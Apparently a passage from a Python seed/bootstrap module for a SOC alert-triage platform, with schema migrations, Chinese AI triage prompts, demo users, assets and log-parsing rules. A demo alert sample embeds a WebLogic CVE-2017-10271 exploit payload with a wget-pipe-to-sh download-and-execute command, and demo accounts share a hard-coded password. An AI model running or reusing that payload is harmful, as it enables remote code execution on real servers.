from sqlalchemy import text
from datetime import datetime, timedelta
from sqlalchemy.orm import Session

from app.core.security import hash_password
from app.core.settings import get_settings
from app.models.entities import AiExperience, AiPrompt, Alert, Asset, AssetSegment, Device, Project, Template, User, Workspace, ParseRule, Setting
from app.services.workflow_constants import (
    GROUP_ANALYSIS,
    GROUP_DISPOSAL,
    GROUP_NONE,
    OLD_STATUS_MAP,
    ROLE_ANALYST,
    ROLE_DISPOSER,
    ROLE_MONITOR,
    STATUS_ANALYSIS,
    STATUS_DISPOSAL,
    STATUS_DISPOSED,
    STATUS_IGNORED,
)


def _ensure_alert_columns(db: Session) -> None:
    dialect = db.bind.dialect.name if db.bind else "sqlite"
    
    if dialect == "sqlite":
        table_columns = {}
        for table in ("alerts", "templates", "parse_rules", "settings"):
            rows = db.execute(text(f"PRAGMA table_info({table})")).fetchall()
            table_columns[table] = {row[1] for row in rows}
        
        if "last_updated_by_id" not in table_columns.get("alerts", {}):
            db.execute(text("ALTER TABLE alerts ADD COLUMN last_updated_by_id INTEGER"))
        if "src_asset_context" not in table_columns.get("alerts", {}):
            db.execute(text("ALTER TABLE alerts ADD COLUMN src_asset_context JSON DEFAULT '{}' NOT NULL"))
        if "dst_asset_context" not in table_columns.get("alerts", {}):
            db.execute(text("ALTER TABLE alerts ADD COLUMN dst_asset_context JSON DEFAULT '{}' NOT NULL"))
        if "alert_hash" not in table_columns.get("alerts", {}):
            db.execute(text("ALTER TABLE alerts ADD COLUMN alert_hash VARCHAR(64) DEFAULT '' NOT NULL"))
        if "dedup_hash" not in table_columns.get("alerts", {}):
            db.execute(text("ALTER TABLE alerts ADD COLUMN dedup_hash VARCHAR(64) DEFAULT '' NOT NULL"))
        alert_columns = table_columns.get("alerts", {})
        for col, col_type in [
            ("current_group", "VARCHAR(40) DEFAULT 'analysis' NOT NULL"),
            ("claimed_at", "DATETIME"),
            ("analysis_owner_id", "INTEGER"),
            ("disposal_owner_id", "INTEGER"),
            ("disposal_target", "VARCHAR(40) DEFAULT '' NOT NULL"),
            ("disposal_action", "VARCHAR(40) DEFAULT '' NOT NULL"),
            ("disposal_ip", "VARCHAR(80) DEFAULT '' NOT NULL"),
            ("closure_target", "VARCHAR(40) DEFAULT '' NOT NULL"),
            ("closure_action", "VARCHAR(60) DEFAULT '' NOT NULL"),
            ("false_positive_reason", "TEXT DEFAULT '' NOT NULL"),
            ("version", "INTEGER DEFAULT 1 NOT NULL"),
        ]:
            if col not in alert_columns:
                db.execute(text(f"ALTER TABLE alerts ADD COLUMN {col} {col_type}"))
        if "device_id" not in table_columns.get("templates", {}):
            db.execute(text("ALTER TABLE templates ADD COLUMN device_id INTEGER"))
        if "is_meta" not in table_columns.get("parse_rules", {}):
            db.execute(text("ALTER TABLE parse_rules ADD COLUMN is_meta BOOLEAN DEFAULT 0 NOT NULL"))
        if "match_all" not in table_columns.get("parse_rules", {}):
            db.execute(text("ALTER TABLE parse_rules ADD COLUMN match_all BOOLEAN DEFAULT 0 NOT NULL"))
        if "user_id" not in table_columns.get("settings", {}):
            db.execute(text("ALTER TABLE settings ADD COLUMN user_id INTEGER"))
    else:
        # PostgreSQL
        for table, col, col_type in [
            ("alerts", "last_updated_by_id", "INTEGER"),
            ("alerts", "src_asset_context", "JSON DEFAULT '{}'::json NOT NULL"),
            ("alerts", "dst_asset_context", "JSON DEFAULT '{}'::json NOT NULL"),
            ("alerts", "alert_hash", "VARCHAR(64) DEFAULT '' NOT NULL"),
            ("alerts", "dedup_hash", "VARCHAR(64) DEFAULT '' NOT NULL"),
            ("alerts", "current_group", "VARCHAR(40) DEFAULT 'analysis' NOT NULL"),
            ("alerts", "claimed_at", "TIMESTAMP"),
            ("alerts", "analysis_owner_id", "INTEGER"),
            ("alerts", "disposal_owner_id", "INTEGER"),
            ("alerts", "disposal_target", "VARCHAR(40) DEFAULT '' NOT NULL"),
            ("alerts", "disposal_action", "VARCHAR(40) DEFAULT '' NOT NULL"),
            ("alerts", "disposal_ip", "VARCHAR(80) DEFAULT '' NOT NULL"),
            ("alerts", "closure_target", "VARCHAR(40) DEFAULT '' NOT NULL"),
            ("alerts", "closure_action", "VARCHAR(40) DEFAULT '' NOT NULL"),
            ("alerts", "false_positive_reason", "TEXT DEFAULT '' NOT NULL"),
            ("alerts", "version", "INTEGER DEFAULT 1 NOT NULL"),
            ("templates", "device_id", "INTEGER"),
            ("parse_rules", "is_meta", "BOOLEAN DEFAULT FALSE NOT NULL"),
            ("parse_rules", "match_all", "BOOLEAN DEFAULT FALSE NOT NULL"),
            ("settings", "user_id", "INTEGER")
        ]:
            check_sql = text(f"""
                SELECT count(*) FROM information_schema.columns 
                WHERE table_name='{table}' AND column_name='{col}'
            """)
            count = db.execute(check_sql).scalar()
            if count == 0:
                db.execute(text(f"ALTER TABLE {table} ADD COLUMN {col} {col_type}"))
        
        # PostgreSQL: 更新 settings 表的唯一约束
        try:
            # 移除旧的约束
            db.execute(text("ALTER TABLE settings DROP CONSTRAINT IF EXISTS uq_setting_workspace_key"))
            # 检查并添加新约束
            check_constraint = text("""
                SELECT count(*) FROM pg_constraint WHERE conname = 'uq_setting_workspace_user_key'
            """)
            if db.execute(check_constraint).scalar() == 0:
                db.execute(text("ALTER TABLE settings ADD CONSTRAINT uq_setting_workspace_user_key UNIQUE (workspace_id, user_id, key)"))
        except Exception as e:
            print(f"[Bootstrap] Update settings constraint failed: {e}")

def _ensure_asset_constraints(db: Session) -> None:
    dialect = db.bind.dialect.name if db.bind else "sqlite"
    if dialect == "sqlite":
        # SQLite 处理：如果存在旧的限制，尝试在初始化时处理（由于 SQLite 限制，通常在代码逻辑层或手动迁移处理）
        pass
    else:
        # PostgreSQL
        for table, name, cols in [
            ("assets", "uq_asset_workspace_ip_domain", "workspace_id, ip, domain"),
            ("asset_segments", "uq_asset_segment_workspace_segment", "workspace_id, segment"),
            ("settings", "uq_setting_workspace_user_key", "workspace_id, user_id, key")
        ]:
            check_sql = text(f"SELECT count(*) FROM pg_constraint WHERE conname = '{name}'")
            count = db.execute(check_sql).scalar()
            if count == 0:
                try:
                    # 如果添加失败，可能是因为旧的 uq_setting_workspace_key 还在（针对 settings 表）
                    if table == "settings":
                        db.execute(text("ALTER TABLE settings DROP CONSTRAINT IF EXISTS uq_setting_workspace_key"))
                    db.execute(text(f"ALTER TABLE {table} ADD CONSTRAINT {name} UNIQUE ({cols})"))
                except Exception:
                    pass

def _backfill_alert_dedup_hashes(db: Session) -> None:
    from app.services.alert_service import alert_dedup_hash, generate_unique_alert_hash

    rows = db.query(Alert).filter(
        (Alert.dedup_hash == "") | (Alert.dedup_hash.is_(None)) | (Alert.alert_hash == "") | (Alert.alert_hash.is_(None))
    ).all()
    for row in rows:
        if not row.dedup_hash:
            row.dedup_hash = alert_dedup_hash(row.parsed_fields or {}, row.device_id)
        if not row.alert_hash:
            row.alert_hash = generate_unique_alert_hash(db, row.workspace_id, row.id)


def _backfill_alert_workflow_fields(db: Session) -> None:
    rows = db.query(Alert).all()
    for row in rows:
        normalized = OLD_STATUS_MAP.get(row.status, row.status or STATUS_ANALYSIS)
        if row.status != normalized:
            row.status = normalized
        if row.status == STATUS_ANALYSIS:
            row.current_group = GROUP_ANALYSIS
            if row.assignee_id and not row.analysis_owner_id:
                row.analysis_owner_id = row.assignee_id
        elif row.status == STATUS_DISPOSAL:
            row.current_group = GROUP_DISPOSAL
            if row.assignee_id and not row.disposal_owner_id:
                row.disposal_owner_id = row.assignee_id
        elif row.status in {STATUS_DISPOSED, STATUS_IGNORED, "false_positive"}:
            row.current_group = GROUP_NONE
            row.assignee_id = None
            row.claimed_at = None
        else:
            row.status = STATUS_ANALYSIS
            row.current_group = GROUP_ANALYSIS


def get_effective_setting(db: Session, workspace_id: int, user_id: int, key: str) -> dict:
    """
    优先级逻辑实现：账号配置 (user_id=user_id) > 全员配置 (user_id=None)
    """
    # 1. 尝试获取个人配置
    personal = db.query(Setting).filter_by(workspace_id=workspace_id, user_id=user_id, key=key).first()
    if personal and personal.value:
        return personal.value
    
    # 2. 获取全员配置
    global_cfg = db.query(Setting).filter(Setting.workspace_id == workspace_id, Setting.user_id.is_(None), Setting.key == key).first()
    return global_cfg.value if global_cfg else {}


def bootstrap_meta_rules(db: Session, workspace_id: int):
    meta_rules = [
        ("事件名称", "event_type", "事件名称", r"事件类型:\s*([\s\S]*?)(?=\s*请求内容:)"),
        ("告警时间", "alert_time", "告警时间", r"告警时间:\s*([\s\S]*?)(?=\s*源IP:)"),
        ("源IP", "src_ip", "源IP", r"源IP:\s*([\s\S]*?)(?=\s*源端口:)"),
        ("源端口", "src_port", "源端口", r"源端口:\s*([\s\S]*?)(?=\s*目的IP:)"),
        ("目的IP", "dst_ip", "目的IP", r"目的IP:\s*([\s\S]*?)\s*$"),
        ("域名", "domain", "域名", r"(?:域名|Host)\s*[:：]\s*([A-Za-z0-9.-]+)"),
        ("目的端口", "dst_port", "目的端口", r"目的端口:\s*([\s\S]*?)(?=\s*协议:)"),
        ("协议", "protocol", "协议", r"协议:\s*([\s\S]*?)(?=\s*事件类型:)"),
        ("请求内容", "request", "请求内容", r"请求内容:\s*([\s\S]*?)(?=\s*响应内容:)"),
        ("响应内容", "response", "响应内容", r"响应内容:\s*([\s\S]*?)(?=\s*攻击载荷:)"),
        ("攻击载荷", "payload", "攻击载荷", r"攻击载荷:\s*([\s\S]*?)\s*$"),
    ]
    for name, key, label, pattern in meta_rules:
        exists = db.query(ParseRule).filter_by(workspace_id=workspace_id, field_key=key, is_meta=True).first()
        if not exists:
            db.add(
                ParseRule(
                    workspace_id=workspace_id,
                    name=name,
                    field_key=key,
                    field_label=label,
                    match_type="regex",
                    pattern=pattern,
                    priority=1,
                    enabled=True,
                    is_meta=True,
                )
            )
        else:
            # 更新名称（去掉前缀）和正则
            exists.name = name
            if exists.pattern == r"(.*)":
                exists.pattern = pattern


def _asset_context(asset: Asset | None) -> dict:
    if not asset:
        return {}
    return {
        "id": asset.id,
        "ip": asset.ip,
        "domain": asset.domain,
        "name": asset.name,
        "area": asset.area,
        "owner": asset.owner,
        "department": asset.department,
        "criticality": asset.criticality,
        "environment": asset.environment,
        "tags": asset.tags or [],
        "fingerprints": asset.fingerprints or {},
        "description": asset.description,
    }


def _ensure_setting(db: Session, workspace_id: int, key: str, value: dict) -> Setting:
    row = db.query(Setting).filter_by(workspace_id=workspace_id, user_id=None, key=key).first()
    if not row:
        row = Setting(workspace_id=workspace_id, key=key, user_id=None, value=value)
        db.add(row)
        db.flush()
    return row


def _ensure_template(db: Session, workspace_id: int, payload: dict) -> Template:
    row = db.query(Template).filter_by(workspace_id=workspace_id, name=payload["name"]).first()
    if not row:
        row = Template(workspace_id=workspace_id, **payload)
        db.add(row)
        db.flush()
    else:
        for key, value in payload.items():
            setattr(row, key, value)
    return row


def _ensure_rule(db: Session, workspace_id: int, payload: dict) -> ParseRule:
    row = db.query(ParseRule).filter_by(workspace_id=workspace_id, name=payload["name"]).first()
    if not row:
        row = ParseRule(workspace_id=workspace_id, **payload)
        db.add(row)
        db.flush()
    else:
        for key, value in payload.items():
            setattr(row, key, value)
    return row


def _ensure_ai_prompt(db: Session, workspace_id: int, payload: dict) -> AiPrompt:
    row = db.query(AiPrompt).filter_by(workspace_id=workspace_id, prompt_key=payload["prompt_key"], name=payload["name"]).first()
    if not row:
        row = AiPrompt(workspace_id=workspace_id, **payload)
        db.add(row)
        db.flush()
    else:
        for key, value in payload.items():
            setattr(row, key, value)
    if row.is_default:
        db.query(AiPrompt).filter(
            AiPrompt.workspace_id == workspace_id,
            AiPrompt.prompt_key == row.prompt_key,
            AiPrompt.id != row.id,
        ).update({"is_default": False})
    return row


def _ensure_ai_defaults(db: Session, workspace_id: int) -> None:
    prompts = [
        {
            "name": "默认告警研判提示词",
            "prompt_key": "alert_analysis",
            "category": "告警研判",
            "system_prompt": (
                "你是资深安全运营专家。你的任务是根据提供的证据包和历史经验对告警进行深度研判。\n"
                "### 研判准则：\n"
                "1. **事实优先**：严禁凭空猜测，所有结论必须有证据包中的字段支撑。\n"
                "2. **分层分析**：从事件真实性（是否为扫描/攻击）、资产价值（是否为核心资产）、攻击后果（是否执行成功/回显）三个维度展开。\n"
                "3. **闭环导向**：明确给出处置建议，如“封禁源IP”、“下线组件”、“复核业务”。\n"
                "### 约束：\n"
                "不要输出任何密码或密钥。"
            ),
            "user_prompt": (
                "当前告警证据包：\n{evidence_pack}\n\n可参考的历史 经验提取：\n{experience_injection}\n\n"
                "请输出研判结论、风险等级（low/medium/high/critical）、核心理由、引用的经验编号、具体的处置建议，并说明当前信息下存在的不确定性。"
            ),
            "output_schema": {"verdict": "", "risk_level": "", "reasoning": [], "referenced_experiences": [], "recommended_action": "", "uncertainty": ""},
            "variables": ["evidence_pack", "experience_injection"],
            "enabled": True,
            "is_default": True,
        },
        {
            "name": "默认 STE 经验提取提示词",
            "prompt_key": "ste_extract",
            "category": "经验提取",
            "system_prompt": (
                "你是安全运营知识管理专家。你的任务是将已闭环的告警复盘为标准化的 STE（Situation-Task-Evidence）知识记录。\n"
                "### STE 提取要求：\n"
                "1. **Situation (S)**：概括攻击的背景、目标和利用的技术。\n"
                "2. **Task (T)**：拆解研判时的关键动作路径和最终结论。\n"
                "3. **Evidence (E)**：列出最具识别性的特征（如特定 URL 路径、关键 Paylaod 字符）。\n"
                "### 索引要求：\n"
                "必须提取用于后续匹配的 event_type_keywords、request_paths 和 payload_keywords。"
            ),
            "user_prompt": "证据包：\n{evidence_pack}\n\n请严格按以下 JSON Schema 输出 STE 记录：\n{output_schema}",
            "output_schema": {
                "meta": {"id": "KNOW-STE-0000", "title": "", "tags": []},
                "index": {"rule_id": [], "cve": [], "event_type_keywords": [], "request_paths": [], "payload_keywords": [], "response_codes": [], "asset_tags": [], "asset_area": "", "attack_result": "", "terminal_status": ""},
                "ste": {"S": "", "T": {"steps": [], "conclusion": ""}, "E": {"alarm": {}, "proof": {}}},
                "action": {"asset": "", "soar": ""},
                "quality": {"confidence": "medium", "risk": "", "review_notes": ""},
            },
            "variables": ["evidence_pack", "output_schema"],
            "enabled": True,
            "is_default": True,
        },
        {
            "name": "默认 AI 证据提取提示词",
            "prompt_key": "evidence_extract",
            "category": "证据提取",
            "system_prompt": (
                "你是安全日志深度解析器。你的任务是从原始文本中提取结构化证据。\n"
                "### 提取红线：\n"
                "1. **零推断**：只提取原文中白纸黑字出现的内容。禁止联想或补全（如根据漏洞名猜测路径）。\n"
                "2. **置信度分级**：原文直观显示的设为 high；需要简单转换的设为 medium。\n"
                "3. **空值诚实**：原文中没有的信息，必须返回空值或 null。"
            ),
            "user_prompt": "已知字段：{known_fields}\n需要通过原始日志补充的字段：{missing_fields}\n原始日志片段：\n{raw_text_excerpt}",
            "output_schema": {"field_name": {"value": "", "evidence": "提取来源片段", "confidence": "high"}},
            "variables": ["known_fields", "missing_fields", "raw_text_excerpt"],
            "enabled": True,
            "is_default": True,
        },
        {
            "name": "默认模板生成提示词",
            "prompt_key": "template_generate",
            "category": "模板生成",
            "system_prompt": (
                "你是安全运营模板生成专家。你的核心任务是将用户样例中的真实值精准替换为平台变量。\n"
                "### 核心准则：\n"
                "1. **格式零变动**：禁止添加、删除或修改样例中的任何文本、排版、缩进或换行。\n"
                "2. **严禁幻觉内容**：如果用户样例只有一行，输出也必须只有一行。不要生成多余的标题或总结。\n"
                "3. **变量精准匹配**：只能使用提供的候选变量，不要臆造变量名。"
            ),
            "user_prompt": "模板类型：{template_type}\n目标：{intent}\n候选变量：\n{variables}\n\n用户样例：\n{sample_text}\n\n输出 JSON：name、content、variables、mappings、warnings。",
            "output_schema": {"name": "", "content": "", "variables": [], "mappings": [], "warnings": []},
            "variables": ["template_type", "intent", "variables", "sample_text"],
            "enabled": True,
            "is_default": True,
        },
        {
            "name": "默认对话助手提示词",
            "prompt_key": "chat",
            "category": "对话中心",
            "system_prompt": (
                "你是安全运营平台指挥官（SOC Commander）。你精通平台的所有数据资产，能通过调用后端工具提供专业解答。\n"
                "### 响应准则：\n"
                "1. **证据为王**：必须优先使用工具结果（Evidence Pack）回答问题。如果工具没返回数据，请如实告知并说明查询范围。\n"
                "2. **结论先行**：直接给出问题的答案（如：负责人是张三），再列出依据。不要说“根据查询结果...”。\n"
                "3. **保持中立且专业**：不猜测、不浮夸。如果存在不确定性，请明确标注。\n"
                "4. **安全红线**：严禁输出任何密码、令牌（Token）或密钥。"
            ),
            "user_prompt": "用户问题：{question}\n工具结果：\n{tool_results}",
            "output_schema": {"answer": ""},
            "variables": ["question", "tool_results"],
            "enabled": True,
            "is_default": True,
        },
    ]
    for payload in prompts:
        _ensure_ai_prompt(db, workspace_id, payload)


def _ensure_asset(db: Session, workspace_id: int, payload: dict) -> Asset:
    row = (
        db.query(Asset)
        .filter(Asset.workspace_id == workspace_id, Asset.ip == payload.get("ip", ""), Asset.domain == payload.get("domain", ""))
        .first()
    )
    if not row:
        row = Asset(workspace_id=workspace_id, asset_key=f"demo-{workspace_id}-{payload.get('ip') or payload.get('domain')}", **payload)
        db.add(row)
        db.flush()
    return row


def _ensure_demo_data(db: Session, workspace: Workspace, admin: User) -> None:
    analyst = db.query(User).filter_by(username="demo_analyst").first()
    if not analyst:
        analyst = User(
            workspace_id=workspace.id,
            username="demo_analyst",
            display_name="演示研判员",
            password_hash=hash_password("demo123456"),
            role=ROLE_ANALYST,
            is_active=True,
        )
        db.add(analyst)
        db.flush()
    else:
        analyst.role = ROLE_ANALYST

    monitor = db.query(User).filter_by(username="demo_monitor").first()
    if not monitor:
        monitor = User(
            workspace_id=workspace.id,
            username="demo_monitor",
            display_name="演示监测员",
            password_hash=hash_password("demo123456"),
            role=ROLE_MONITOR,
            is_active=True,
        )
        db.add(monitor)
        db.flush()

    disposer = db.query(User).filter_by(username="demo_disposer").first()
    if not disposer:
        disposer = User(
            workspace_id=workspace.id,
            username="demo_disposer",
            display_name="演示处置员",
            password_hash=hash_password("demo123456"),
            role=ROLE_DISPOSER,
            is_active=True,
        )
        db.add(disposer)
        db.flush()

    viewer = db.query(User).filter_by(username="demo_viewer").first()
    if not viewer:
        db.add(
            User(
                workspace_id=workspace.id,
                username="demo_viewer",
                display_name="演示只读员",
                password_hash=hash_password("demo123456"),
                role="viewer",
                is_active=True,
            )
        )

    project = db.query(Project).filter_by(workspace_id=workspace.id, name="演示项目-攻防演练").first()
    if not project:
        project = Project(workspace_id=workspace.id, name="演示项目-攻防演练", description="用于快速验证内容解析、资产联动、告警协作和导出功能。")
        db.add(project)
        db.flush()

    ops_project = db.query(Project).filter_by(workspace_id=workspace.id, name="演示项目-日常运营").first()
    if not ops_project:
        ops_project = Project(workspace_id=workspace.id, name="演示项目-日常运营", description="日常 SOC 运营管理项目。")
        db.add(ops_project)
        db.flush()

    waf = db.query(Device).filter_by(workspace_id=workspace.id, name="演示设备-WAF").first()
    if not waf:
        waf = Device(workspace_id=workspace.id, name="演示设备-WAF", vendor="DemoSec", product="WebShield", version="2.6")
        db.add(waf)
        db.flush()

    ndr = db.query(Device).filter_by(workspace_id=workspace.id, name="演示设备-NDR").first()
    if not ndr:
        ndr = Device(workspace_id=workspace.id, name="演示设备-NDR", vendor="DemoSec", product="NetSensor", version="5.1")
        db.add(ndr)
        db.flush()

    situational_awareness = db.query(Device).filter_by(workspace_id=workspace.id, name="演示设备-态势感知").first()
    if not situational_awareness:
        situational_awareness = Device(
            workspace_id=workspace.id,
            name="演示设备-态势感知",
            vendor="DemoSec",
            product="态势感知平台",
            version="Demo-2026",
        )
        db.add(situational_awareness)
        db.flush()

    portal = _ensure_asset(
        db,
        workspace.id,
        {
            "ip": "172.21.112.184",
            "domain": "portal.demo.local",
            "name": "演示资产-外部门户",
            "area": "生产区",
            "owner": "张三",
            "department": "业务平台部",
            "criticality": "critical",
            "environment": "production",
            "tags": ["核心资产", "外网暴露"],
            "fingerprints": {"操作系统": "Ubuntu 22.04", "中间件": "Nginx", "数据库": "MySQL", "开放端口": "80,443"},
            "description": "用于验证内容解析源资产命中。",
        },
    )
    api_asset = _ensure_asset(
        db,
        workspace.id,
        {
            "ip": "172.16.1.80",
            "domain": "api.demo.local",
            "name": "演示资产-交易 API",
            "area": "生产区",
            "owner": "李四",
            "department": "交易系统部",
            "criticality": "high",
            "environment": "production",
            "tags": ["重要业务", "内网服务"],
            "fingerprints": {"操作系统": "Debian 12", "中间件": "Tomcat", "业务系统": "交易 API"},
            "description": "用于验证内容解析目的资产命中。",
        },
    )
    db_asset = _ensure_asset(
        db,
        workspace.id,
        {
            "ip": "10.20.30.40",
            "domain": "db-demo.internal",
            "name": "演示资产-数据库节点",
            "area": "核心数据区",
            "owner": "王五",
            "department": "数据平台部",
            "criticality": "critical",
            "environment": "production",
            "tags": ["数据库", "核心数据"],
            "fingerprints": {"数据库": "PostgreSQL 16", "开放端口": "5432"},
            "description": "资产导出和资产查询数据参考。",
        },
    )
    office_asset = _ensure_asset(
        db,
        workspace.id,
        {
            "ip": "192.168.66.23",
            "domain": "",
            "name": "演示资产-办公终端",
            "area": "办公区",
            "owner": "赵六",
            "department": "综合部",
            "criticality": "low",
            "environment": "office",
            "tags": ["办公终端"],
            "fingerprints": {"操作系统": "Windows 11"},
            "description": "终端资产数据，用于验证资产重要性分级。",
        },
    )
    weblogic_asset = _ensure_asset(
        db,
        workspace.id,
        {
            "ip": "203.0.113.104",
            "domain": "weblogic.demo.local",
            "name": "演示资产-WebLogic业务服务器",
            "area": "DMZ区",
            "owner": "安全运营组",
            "department": "业务平台部",
            "criticality": "high",
            "environment": "production",
            "tags": ["态势感知样例", "WebLogic", "外网暴露"],
            "fingerprints": {"中间件": "WebLogic", "开放端口": "9002", "漏洞": "CVE-2017-10271"},
            "description": "用于验证态势感知原始内容解析和资产命中。",
        },
    )

    # 演示网段资产
    demo_segments = [
        {
            "segment": "10.10.10.0/24",
            "name": "态势感知管理网段",
            "area": "管理区",
            "owner": "系统管理员",
            "department": "运维部",
            "criticality": "high",
            "environment": "production",
            "description": "用于演示网段资产匹配（兜底逻辑）",
        },
        {
            "segment": "192.168.1.0/24",
            "name": "外部门户及 WAF 业务段",
            "area": "DMZ区",
            "owner": "业务安全组",
            "department": "业务平台部",
            "criticality": "critical",
            "environment": "production",
            "description": "模拟业务暴露面网段",
        }
    ]
    for seg_data in demo_segments:
        exists = db.query(AssetSegment).filter_by(workspace_id=workspace.id, segment=seg_data["segment"]).first()
        if not exists:
            db.add(AssetSegment(workspace_id=workspace.id, **seg_data))

    ip_list = _ensure_setting(db, workspace.id, "ip_lists", {"whitelist": [], "blacklist": []})
    whitelist = list(dict.fromkeys((ip_list.value or {}).get("whitelist", []) + ["172.16.1.80", "192.168.66.0/24"]))
    blacklist = list(dict.fromkeys((ip_list.value or {}).get("blacklist", []) + ["203.0.113.66", "198.51.100.10-20"]))
    ip_list.value = {"whitelist": whitelist, "blacklist": blacklist}

    situational_awareness_sample = (
        "智能安全运营管理平台\n"
        "态势感知\n"
        "分析中心 / 威胁分析 / 事件研判 / 详情\n"
        "事件概述\n"
        "事件名称：WebLogic WLS 组件远程命令执行漏洞（CVE-2017-10271）\n"
        "攻击结果：企图\n"
        "源198.51.100.22目203.0.113.104\n"
        "攻击链阶段 :\n攻击渗透\n"
        "处置状态 :\n已处理\n"
        "规则 ID :24174\n"
        "事件分类 :\n威胁类\n"
        "开始结束时间 :\n2026-05-24 05:05:36~2026-05-24 05:05:36\n"
        "优先级 :\n低\n"
        "威胁等级 :\n一般\n"
        "设备来源 :\n态势感知 _10.10.10.22\n"
        "置信度 :\n中\n"
        "设备动作 :\n允许\n"
        "时间戳:\n2026-05-24 05:05:36\n"
        "日志类型:\n远程命令执行漏洞\n"
        "日志名称:\n入侵防护日志\n"
        "日志消息内容:\nWebLogic WLS 组件远程命令执行漏洞（CVE-2017-10271）\n"
        "日志附带的结果:\n企图\n"
        "产品类型:\n态势感知\n产品版本:\nDemo-2026\n厂商:\nDemoSec\n设备地址:\n10.10.10.22\n"
        "源IP:\n198.51.100.22\n源端口:\n52250\n"
        "目的IP:\n203.0.113.104\n目的端口:\n9002\n"
        "载荷:\nPOST /wls-wsat/CoordinatorPortType HTTP/1.1|||||<string>/bin/sh</string><string>-c</string><string>(wget -qO- http://203.0.113.134/rondo.xcw.sh)|sh&amp;</string>|||||\n"
        "响应码:\n--\n响应内容:\n.\n"
        "请求内容:\nPOST /wls-wsat/CoordinatorPortType HTTP/1.1. Host: 203.0.113.104:9002. User-Agent: Mozilla/5.0. Content-Type: text/xml. <java version=\"1.8\" class=\"java.beans.XMLDecoder\"><void class=\"java.lang.ProcessBuilder\"><string>/bin/sh</string><string>-c</string></void></java> .\n"
    )

    _ensure_rule(
        db,
        workspace.id,
        {
            "device_id": waf.id,
            "name": "演示规则-WAF风险等级",
            "field_key": "severity",
            "field_label": "风险等级",
            "match_type": "regex",
            "pattern": r"风险等级[:：]\s*([^\n]+)",
            "priority": 20,
            "enabled": True,
            "sample_log": "",
        },
    )
    _ensure_rule(
        db,
        workspace.id,
        {
            "device_id": ndr.id,
            "name": "演示规则-攻击阶段",
            "field_key": "attack_stage",
            "field_label": "攻击阶段",
            "match_type": "regex",
            "pattern": r"攻击阶段[:：]\s*([^\n]+)",
            "priority": 30,
            "enabled": True,
            "sample_log": "",
        },
    )
    situational_awareness_rules = [
        ("演示规则-态势感知事件类型", "event_type", "事件名称", r"(?:事件名称|日志消息内容)\s*[:：]\s*([^\n]+)", 40),
        ("演示规则-态势感知告警时间", "alert_time", "告警时间", r"(?:时间戳|开始结束时间)\s*[:：]\s*([0-9]{4}-[0-9]{2}-[0-9]{2}\s+[0-9]{2}:[0-9]{2}:[0-9]{2})", 41),
        ("演示规则-态势感知源IP", "src_ip", "源IP", r"(?:源IP\s*[:：]\s*|源\s*)((?:\d{1,3}\.){3}\d{1,3})", 42),
        ("演示规则-态势感知源端口", "src_port", "源端口", r"源端口\s*[:：]\s*(\d+)", 43),
        ("演示规则-态势感知目的IP", "dst_ip", "目的IP", r"(?:目的IP\s*[:：]\s*|目\s*)((?:\d{1,3}\.){3}\d{1,3})", 44),
        ("演示规则-态势感知目的端口", "dst_port", "目的端口", r"目的端口\s*[:：]\s*(\d+)", 45),
        ("演示规则-态势感知请求内容", "request", "请求内容", r"请求内容\s*[:：]\s*([\s\S]*?)(?=\n\s*(?:日志消息内容|时间戳|响应内容|扩展调查|事件详情)\s*[:：]?|\Z)", 46),
        ("演示规则-态势感知响应内容", "response", "响应内容", r"响应内容\s*[:：]\s*([\s\S]*?)(?=\n\s*(?:请求内容|日志消息内容|时间戳|扩展调查|事件详情)\s*[:：]?|\Z)", 47),
        ("演示规则-态势感知载荷", "payload", "攻击载荷", r"载荷\s*[:：]\s*([\s\S]*?)(?=\n\s*(?:响应码|响应内容|请求内容|日志消息内容|时间戳)\s*[:：]|\Z)", 48),
        ("演示规则-态势感知攻击结果", "attack_result", "攻击结果", r"(?:日志附带的结果|攻击结果)\s*[:：]\s*([^\n]+)", 49),
        ("演示规则-态势感知威胁等级", "severity", "威胁等级", r"威胁等级\s*[:：]\s*([^\n]+)", 50),
        ("演示规则-态势感知规则ID", "rule_id", "规则ID", r"规则\s*ID\s*[:：]\s*(\d+)", 51),
        ("演示规则-态势感知攻击链阶段", "attack_stage", "攻击链阶段", r"攻击链阶段\s*[:：]\s*([^\n]+)", 52),
    ]
    for name, field_key, field_label, pattern, priority in situational_awareness_rules:
        _ensure_rule(
            db,
            workspace.id,
            {
                "device_id": situational_awareness.id,
                "name": name,
                "field_key": field_key,
                "field_label": field_label,
                "match_type": "regex",
                "pattern": pattern,
                "priority": priority,
                "enabled": True,
                "sample_log": situational_awareness_sample,
            },
        )

    _ensure_template(
        db,
        workspace.id,
        {
            "device_id": situational_awareness.id,
            "name": "演示模板-态势感知研判通报",
            "type": "message",
            "content": (
                "事件名称：{{演示规则-态势感知事件类型}}\n"
                "告警时间：{{演示规则-态势感知告警时间}}\n"
                "源IP：{{演示规则-态势感知源IP}}\n"
                "目的IP：{{演示规则-态势感知目的IP}}\n"
                "目的资产：{{目的资产名称}} / {{目的资产区域}} / {{目的资产负责人}}\n"
                "目的重要性：{{目的资产重要性}}\n"
                "攻击结果：{{演示规则-态势感知攻击结果}}\n"
                "威胁等级：{{演示规则-态势感知威胁等级}}\n"
                "攻击链阶段：{{演示规则-态势感知攻击链阶段}}\n"
                "规则ID：{{演示规则-态势感知规则ID}}"
            ),
            "variables": ["演示规则-态势感知事件类型", "演示规则-态势感知告警时间", "演示规则-态势感知源IP", "演示规则-态势感知目的IP", "目的资产名称", "目的资产区域", "目的资产负责人", "目的资产重要性", "演示规则-态势感知攻击结果", "演示规则-态势感知威胁等级", "演示规则-态势感知攻击链阶段", "演示规则-态势感知规则ID"],
            "scope": "team",
            "is_default": False,
        },
    )
    _ensure_template(
        db,
        workspace.id,
        {
            "device_id": situational_awareness.id,
            "name": "演示模板-态势感知Excel行",
            "type": "excel",
            "content": "{{演示规则-态势感知告警时间}}\t{{演示规则-态势感知事件类型}}\t{{演示规则-态势感知源IP}}\t{{演示规则-态势感知目的IP}}\t{{目的资产名称}}\t{{目的资产重要性}}\t{{演示规则-态势感知攻击结果}}\t{{演示规则-态势感知规则ID}}\t{{设备名称}}\t{{负责人}}",
            "variables": ["演示规则-态势感知告警时间", "演示规则-态势感知事件类型", "演示规则-态势感知源IP", "演示规则-态势感知目的IP", "目的资产名称", "目的资产重要性", "演示规则-态势感知攻击结果", "演示规则-态势感知规则ID", "设备名称", "负责人"],
            "scope": "team",
            "is_default": False,
        },
    )
    _ensure_template(
        db,
        workspace.id,
        {
            "device_id": None,
            "name": "演示模板-每日运营日报",
            "type": "message",
            "content": (
